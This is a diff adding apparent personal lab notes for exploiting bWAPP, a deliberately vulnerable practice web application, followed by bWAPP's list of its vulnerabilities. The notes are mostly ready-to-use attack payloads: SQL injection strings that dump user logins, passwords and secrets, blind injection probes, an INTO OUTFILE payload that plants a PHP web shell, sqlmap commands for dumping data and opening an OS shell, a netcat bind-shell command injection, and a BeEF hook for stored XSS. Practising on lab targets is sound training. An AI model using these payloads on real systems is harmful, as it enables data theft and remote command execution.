@@ -1,0 +1,298 @@
+=======
+SQLi 1
+=======------------------
+
+SQL INJECTION (SEARCH)
+-------------------------
+
+blah' or 1=1--
+or' blah 1=1--
+blah' or 1=2-- 
+blah' union select 1--
+blah' union select 1,1,1,1,1,1--
+blah' union select 1,DATABASE(),1,1,1,1-- 
+
+blah' union select 1,table_name,1,1,1,1 from INFORMATION_SCHEMA.TABLES where table_schema=database()--
+
+blah' union select 1,column_name,1,1,1,1 from INFORMATION_SCHEMA.COLUMNS where table_name='users' and table_schema=database()--
+
+blah' union select 1,login,password,email,secret,1 from users--
+
+http://localhost/bWAPP/sqli_1.php?title=blah'+or+1=1--%20&action=search
+
+
+http://192.168.1.183/bWAPP/sqli_1.php?title=blah%27+or+1=1--%20&action=search
+
+http://190.190.190.213/bWAPP/sqli_1.php?title=%27&action=search
+
+http://190.190.190.213/bWAPP/sqli_1.php?title=' and 1=0 union all select 1,2,database(),4,5,6,7-- -
+
+http://190.190.190.213/bWAPP/sqli_1.php?title=%27%20and%201=0%20union%20all%20select%201,2,database%28%29,4,5,6,7--%20-
+
+http://190.190.190.213/bWAPP/sqli_1.php?title=a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE"/var/www/bWAPP/images/HACKED_BY_KSANCHEZ.php"-- -
+
+softage.be/itsecgames/bwapp-sqli.rb
+
+
+' and 1=0 union all select 1,2,database(),4,5,6,7 -- -
+
+a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE "/var/www/bWAPP/images/yabadooo.php" -- -
+
+=========
+[SQLMAP]
+=========
+
+./sqlmap.py -u "http://localhost/bWAPP/sqli_1.php?title=&action=search" --cookie="PHPSESSID=pj2jl00ha6s5vrfaldgdcd7dt1;security_level=0" --dbs
+
+./sqlmap.py -u "http://localhost/bWAPP/sqli_1.php?title=&action=search" --cookie="PHPSESSID=pj2jl00ha6s5vrfaldgdcd7dt1;security_level=0" -D bWAPP -T users -C login,email,password,secret --dump
+
+./sqlmap.py -u "http://localhost/bWAPP/sqli_1.php?title=&action=search" --cookie="PHPSESSID=867892bc09b242cfbc13cc626f1b23ed;security_level=0" --os-shell
+
+
+
+COOKIE: 867892bc09b242cfbc13cc626f1b23ed
+
+LOW
+-------
+SQLi 2
+-------
+
+Iron Man' AND 1=1# --
+Iron Man' AND 1=2# --
+Iron Man' AND substring(version()),1,1)=4#   ;VERSION 4
+Iron Man' AND substring(version(),1,1)=5#    ;VERSION 5
+Iron Man' AND length(database())=5#
+Iron Man' AND substring(database(),1,1)="b"#   ;Guessing database name. Se inicia con el primer caracter del nombre de la DB.
+Iron Man' AND substring(database(),2,1)="W"#   ;Guessing database name. Se inicia con el primer caracter del nombre de la DB.
+Iron Man' AND substring(database(),3,1)="A"#   ;Guessing database name. Se inicia con el primer caracter del nombre de la DB.
+Iron Man' AND substring(database(),4,1)="P"#   ;Guessing database name. Se inicia con el primer caracter del nombre de la DB.
+Iron Man' AND substring(database(),5,1)="P"#   ;Guessing database name. Se inicia con el primer caracter del nombre de la DB.  1,2,3,4,5 = numero de caracteres.
+
+
+-------
+3
+-------
+
+;nc -vlp 2222 -e /bin/bash
+
+
+
+-----------
+XSS STORED
+-----------
+http://192.168.1.126/bWAPP/xss_stored_1.php
+
+<script src="http://127.0.0.1:3000/hook.js"></script>
+
+-----
+4
+========
+MSF
+--------
+msf> /usr/share/metasploit-framework/modules/exploits/multi/http/ .
+
+Start msfconsole and type :
+> use exploit/multi/http/bwapp-sqli
+> set RHOST <bWAPP IP ADDRESS>
+> exploit -j 
+
+
+
+
+---------------------------------------------
+bWAPP & bee-box - Overview of vulnerabilities
+---------------------------------------------
+
+Author		: Malik Mesellem, @MME_IT
+Date		: 2/11/2014
+bWAPP version	: bWAPP v2.2
+bee-box version	: bee-box v1.6
+
+--------------
+A1 - Injection
+--------------
+HTML Injection - Reflected (GET)
+HTML Injection - Reflected (POST)
+HTML Injection - Reflected (Current URL)
+HTML Injection - Stored (Blog)
+iFrame Injection
+LDAP Injection (Search)
+Mail Header Injection (SMTP)
+OS Command Injection
+OS Command Injection - Blind
+PHP Code Injection
+Server-Side Includes (SSI) Injection
+SQL Injection (GET/Search)
+SQL Injection (GET/Select)
+SQL Injection (POST/Search)
+SQL Injection (POST/Select)
+SQL Injection (AJAX/JSON/jQuery)
+SQL Injection (CAPTCHA)
+SQL Injection (Login Form/Hero)
+SQL Injection (Login Form/User)
+SQL Injection (SQLite)
+SQL Injection (Drupal)
+SQL Injection - Stored (Blog)
+SQL Injection - Stored (SQLite)
+SQL Injection - Stored (User-Agent)
+SQL Injection - Stored (XML)
+SQL Injection - Blind - Boolean-Based
+SQL Injection - Blind - Time-Based
+SQL Injection - Blind (SQLite)
+SQL Injection - Blind (Web Services/SOAP)
+XML/XPath Injection (Login Form)
+XML/XPath Injection (Search)
+
+-----------------------------------------------
+A2 - Broken Authentication & Session Management
+-----------------------------------------------
+Broken Authentication - CAPTCHA Bypassing
+Broken Authentication - Forgotten Function
+Broken Authentication - Insecure Login Forms
+Broken Authentication - Logout Management
+Broken Authentication - Password Attacks
+Broken Authentication - Weak Passwords
+Session Management - Administrative Portals
+Session Management - Cookies (HTTPOnly)
+Session Management - Cookies (Secure)
+Session Management - Session ID in URL
+Session Management - Strong Sessions
+
+-------------------------------
+A3 - Cross-Site Scripting (XSS)
+-------------------------------
+Cross-Site Scripting - Reflected (GET)
+Cross-Site Scripting - Reflected (POST)
+Cross-Site Scripting - Reflected (JSON)
+Cross-Site Scripting - Reflected (AJAX/JSON)
+Cross-Site Scripting - Reflected (AJAX/XML)
+Cross-Site Scripting - Reflected (Back Button)
+Cross-Site Scripting - Reflected (Custom Header)
+Cross-Site Scripting - Reflected (Eval)
+Cross-Site Scripting - Reflected (HREF)
+Cross-Site Scripting - Reflected (Login Form)
+Cross-Site Scripting - Reflected (phpMyAdmin)
+Cross-Site Scripting - Reflected (PHP_SELF)
+Cross-Site Scripting - Reflected (Referer)
+Cross-Site Scripting - Reflected (User-Agent)
+Cross-Site Scripting - Stored (Blog)
+Cross-Site Scripting - Stored (Change Secret)
+Cross-Site Scripting - Stored (Cookies)
+Cross-Site Scripting - Stored (SQLiteManager)
+Cross-Site Scripting - Stored (User-Agent)
+
+--------------------------------------
+A4 - Insecure Direct Object References
+--------------------------------------
+Insecure DOR (Change Secret)
+Insecure DOR (Reset Secret)
+Insecure DOR (Order Tickets)
+
+------------------------------
+A5 - Security Misconfiguration
+------------------------------
+Arbitrary File Access (Samba)
+Cross-Domain Policy File (Flash)
+Cross-Origin Resource Sharing (AJAX)
+Cross-Site Tracing (XST)
+Denial-of-Service (Large Chunk Size)
+Denial-of-Service (Slow HTTP DoS)
+Denial-of-Service (SSL-Exhaustion)
+Denial-of-Service (XML Bomb)
+Insecure DistCC Configuration
+Insecure FTP Configuration
+Insecure NTP Configuration
+Insecure SNMP Configuration
+Insecure VNC Configuration
+Insecure WebDAV Configuration
+Local Privilege Escalation (sendpage)
+Local Privilege Escalation (udev)
+Man-in-the-Middle Attack (HTTP)
+Man-in-the-Middle Attack (SMTP)
+Old/Backup & Unreferenced Files
+Robots File (Disclosure)
+
+----------------------------
+A6 - Sensitive Data Exposure
+----------------------------
+Base64 Encoding (Secret)
+BEAST/CRIME/BREACH SSL Attacks
+Clear Text HTTP (Credentials)
+Heartbleed Vulnerability
+Host Header Attack (Reset Poisoning)
+HTML5 Web Storage (Secret)
+POODLE Vulnerability
+SSL 2.0 Deprecated Protocol
+Text Files (Accounts)
+
+--------------------------------------------
+A7 - Missing Functional Level Access Control
+--------------------------------------------
+Directory Traversal - Directories
+Directory Traversal - Files
+Host Header Attack (Cache Poisoning)
+Host Header Attack (Reset Poisoning)
+Local File Inclusion (SQLiteManager)
+Remote & Local File Inclusion (RFI/LFI)
+Restrict Device Access
+Restrict Folder Access
+Server Side Request Forgery (SSRF)
+XML External Entity Attacks (XXE)
+
+--------------------------------------
+A8 - Cross-Site Request Forgery (CSRF)
+--------------------------------------
+Cross-Site Request Forgery (Change Password)
+Cross-Site Request Forgery (Change Secret)
+Cross-Site Request Forgery (Transfer Amount)
+
+--------------------------------------
+A9 - Using Known Vulnerable Components
+--------------------------------------
+Buffer Overflow (Local)
+Buffer Overflow (Remote)
+Drupal SQL Injection (Drupageddon)
+Heartbleed Vulnerability
+PHP CGI Remote Code Execution
+PHP Eval Function
+phpMyAdmin BBCode Tag XSS
+Shellshock Vulnerability
+SQLiteManager Local File Inclusion
+SQLiteManager PHP Code Injection
+SQLiteManager XSS
+
+--------------------------------------
+A10 - Unvalidated Redirects & Forwards
+--------------------------------------
+Unvalidated Redirects & Forwards (1)
+Unvalidated Redirects & Forwards (2)
+
+----------
+Other bugs
+----------
+ClickJacking (Movie Tickets)
+Client-Side Validation (Password)
+HTTP Parameter Pollution
+HTTP Response Splitting
+HTTP Verb Tampering
+Information Disclosure - Favicon
+Information Disclosure - Headers
+Information Disclosure - PHP version
+Information Disclosure - Robots File
+Insecure iFrame (Login Form)
+Unrestricted File Upload
+
+------
+Extras
+------
+A.I.M. - No-authentication Mode
+Client Access Policy File
+Cross-Domain Policy File
+Evil 666 Fuzzing Page
+Hidden Backdoor File
+Manual Intervention Required!
+Unprotected Admin Portal
+We Steal Secrets... (html)
+We Steal Secrets... (plain)
+WSDL File (Web Services/SOAP)
+
